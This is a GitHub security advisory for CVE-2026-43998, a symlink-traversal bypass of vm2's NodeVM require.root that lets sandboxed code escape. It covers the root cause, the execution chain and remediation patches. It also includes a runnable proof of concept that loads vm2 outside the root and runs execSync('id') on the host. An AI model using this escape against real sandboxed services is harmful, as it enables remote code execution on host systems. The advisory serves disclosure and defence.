# [H] vm2 has a NodeVM require.root bypass via symlink traversal that allows sandbox escape

## Summary
Severity: High
Advisory: GHSA-cp6g-6699-wx9c
CVE: CVE-2026-43998
CWE: CWE-59
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-cp6g-6699-wx9c
Type: github-advisory

## Affected
- npm: `vm2` — affected >=3.10.5 <3.11.0

## Details
## Summary
NodeVM's `require.root` path restriction can be bypassed using filesystem symlinks, allowing sandboxed code to load modules from outside the allowed root directory in host context. Because path validation uses `path.resolve()` (which does not dereference symlinks) but module loading uses Node's native `require()` (which does), an attacker can load arbitrary host-realm modules and achieve remote code execution.

## Severity
**High** (CVSS 3.1: 8.5)

`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H`

- **Attack Vector:** Network — sandboxed code is typically received from external sources (user-submitted scripts, plugin code)
- **Attack Complexity:** High — requires symlinks inside the allowed root that point outside it; common with pnpm, npm workspaces, and npm link but not guaranteed in all deployments
- **Privileges Required:** Low — attacker needs only the ability to submit code to the sandbox, which is the intended use case
- **User Interaction:** None
- **Scope:** Changed — the vulnerability is in the sandbox boundary; impact is on the host system
- **Confidentiality Impact:** High — arbitrary file read via host command execution
- **Integrity Impact:** High — arbitrary command execution on the host
- **Availability Impact:** High — arbitrary command execution on the host

## Affected Component
- `lib/resolver-compat.js` — `CustomResolver.isPathAllowed()` (line 53-60)
- `lib/resolver-compat.js` — `CustomResolver.loadJS()` (line 62-66)
- `lib/filesystem.js` — `DefaultFileSystem.resolve()` (line 8-10)

## CWE
- **CWE-59**: Improper Link Resolution Before File Access

## Description

### Root Cause: Check/Use Path Discrepancy

The `isPathAllowed` method validates whether a resolved filename falls within the allowed root paths using a string-prefix check:

```js
// lib/resolver-compat.js:53-60
isPathAllowed(filename) {
    return this.rootPaths === undefined || this.rootPaths.some(path => {
        if (!filename.startsWith(path)) return false;
        const len = path.length;
        if (filename.length === len || (len > 0 && this.fs.isSeparator(path[len-1]))) return true;
        return this.fs.isSeparator(filename[len]);
    });
}
```

The filename passed to this check is resolved via `DefaultFileSystem.resolve()`, which uses `path.resolve()`:

```js
// lib/filesystem.js:8-10
resolve(path) {
    return pa.resolve(path);
}
```

`path.resolve()` normalizes the path (resolves `.`, `..`, and makes it absolute) but does **NOT** dereference symlinks. A symlink at `/root/node_modules/safe` pointing to `/outside/root/malicious` resolves to `/root/node_modules/safe` — passing the prefix check.

However, the actual module loading uses Node's native `require()`, which **does** follow symlinks:

```js
// lib/resolver-compat.js:62-66
loadJS(vm, mod, filename) {
    if (this.pathContext(filename, 'js') !== 'host') return super.loadJS(vm, mod, filename);
    const m = this.hostRequire(filename);
    mod.exports = vm.readonly(m);
}
```

### No Symlink Defenses Exist

A search for `realpath`, `readlink`, `lstat`, or any symlink-aware function across the entire `lib/` directory returns zero results. Neither `DefaultFileSystem` nor `VMFileSystem` provides a realpath method. The root paths themselves are also resolved without dereferencing symlinks:

```js
// lib/resolver-compat.js:218
const checkedRootPaths = rootPaths ? (Array.isArray(rootPaths) ? rootPaths : [rootPaths]).map(f => fsOpt.resolve(f)) : undefined;
```

### Full Execution Chain

1. Host creates `NodeVM` with `require: { external: ['safe'], root: '/tmp/root', context: 'host' }`
2. A symlink exists: `/tmp/root/node_modules/safe` → `/outside/root/vm2/` (e.g., via pnpm, npm link, or workspaces)
3. Sandbox code calls `require('safe')`
4. `DefaultResolver.resolveFull()` resolves to `/tmp/root/node_modules/safe/index.js`
5. `tryFile()` calls `this.fs.resolve(x)` → `path.resolve()` → `/tmp/root/node_modules/safe/index.js` (symlink NOT followed)
6. `isPathAllowed()` checks if path starts with `/tmp/root/` → **PASSES**
7. `loadJS()` detects `context: 'host'`, calls `this.hostRequire(filename)`
8. Node's `require()` follows the symlink, loads from `/outside/root/vm2/index.js`
9. Module executes in host realm; exports proxied to sandbox
10. Sandbox uses loaded module to escalate (e.g., creates a new privileged NodeVM with `child_process`)

## Proof of Concept

```js
const path = require('path');
const fs = require('fs');
const os = require('os');
const { NodeVM } = require('vm2');

// Create an "allowed" root directory
const root = fs.mkdtempSync(path.join(os.tmpdir(), 'vm2-root-'));
fs.mkdirSync(path.join(root, 'node_modules'), { recursive: true });

// Symlink inside root pointing to vm2 package outside root
// In real deployments: pnpm, npm link, workspaces create these automatically
const link = path.join(root, 'node_modules', 'safe');
fs.symlinkSync(path.resolve(__dirname), link, 'dir');

const vm = new NodeVM({
  require: {
    external: ['safe'],
    root,
    context: 'host',
    builtin: [],       // no builtins allowed
  },
});

// Sandbox code loads vm2 from outside root via symlink,
// creates a privileged inner NodeVM to get child_process
const out = vm.run(`
  const { NodeVM } = require('safe');
  const inner = new NodeVM({ require: { builtin: ['child_process'] } });
  module.exports = inner.run(
    "module.exports = require('child_process').execSync('id').toString()",
    'inner.js'
  );
`, path.join(root, 'vm.js'));

console.log(out.trim()); // prints host uid/gid — RCE achieved
```

## Impact
- **Sandbox escape**: Untrusted sandboxed code can load arbitrary modules from outside the allowed root directory in host context.
- **Remote code execution**: By loading vm2 itself (or any module with dangerous capabilities), the attacker can execute arbitrary commands on the host system.
- **Bypasses `require.root` entirely**: The root restriction — the primary defense against module loading attacks — provides no protection when symlinks are present.
- **Common in production**: pnpm (where ALL `node_modules` are symlinks), npm workspaces, and `npm link` all create the symlink conditions required for exploitation.
- **Silent failure**: No error or warning is raised when a symlink traverses outside the root.

## Recommended Remediation

### Option 1: Dereference symlinks with `fs.realpathSync` before path validation (Preferred)

Resolve symlinks before checking against root paths, so the validation operates on the actual filesystem location:

```js
// lib/filesystem.js — add a realpath method
const fs = require('fs');

class DefaultFileSystem {
    resolve(path) {
        return pa.resolve(path);
    }

    realpath(path) {
        return fs.realpathSync(path);
    }
    // ... rest unchanged
}
```

```js
// lib/resolver-compat.js — use realpath in isPathAllowed or before calling it
isPathAllowed(filename) {
    let realFilename;
    try {
        realFilename = this.fs.realpath(filename);
    } catch (e) {
        return false; // file doesn't exist or can't be resolved
    }
    return this.rootPaths === undefined || this.rootPaths.some(path => {
        if (!realFilename.startsWith(path)) return false;
        const len = path.length;
        if (realFilename.length === len || (len > 0 && this.fs.isSeparator(path[len-1]))) return true;
        return this.fs.isSeparator(realFilename[len]);
    });
}
```

Also dereference root paths at construction time:

```js
// lib/resolver-compat.js:218
const checkedRootPaths = rootPaths ? (Array.isArray(rootPaths) ? rootPaths : [rootPaths]).map(f => {
    const resolved = fsOpt.resolve(f);
    try { return fs.realpathSync(resolved); } catch (e) { return resolved; }
}) : undefined;
```

**Tradeoff**: `realpathSync` adds a syscall per path check. Cache results to minimize overhead.

### Option 2: Validate the realpath in `makeExtensionHandler` / `checkAccess`

Add a realpath check at the enforcement point in `Resolver.makeExtensionHandler`:

```js
makeExtensionHandler(vm, name) {
    return (mod, filename) => {
        filename = this.fs.resolve(filename);
        // Dereference symlinks before access check
        try {
            const realFilename = fs.realpathSync(filename);
            if (realFilename !== filename) {
                // Filename was a symlink — validate the real path too
                this.checkAccess(mod, realFilename);
            }
        } catch (e) {
            throw new VMError(`Access denied to require '${filename}'`, 'EDENIED');
        }
        this.checkAccess(mod, filename);
        this[name](vm, mod, filename);
    };
}
```

**Tradeoff**: Fixes it at a higher layer but doesn't protect custom resolvers that bypass `makeExtensionHandler`.

## Credit
This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-cp6g-6699-wx9c
- https://nvd.nist.gov/vuln/detail/CVE-2026-43998
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.0
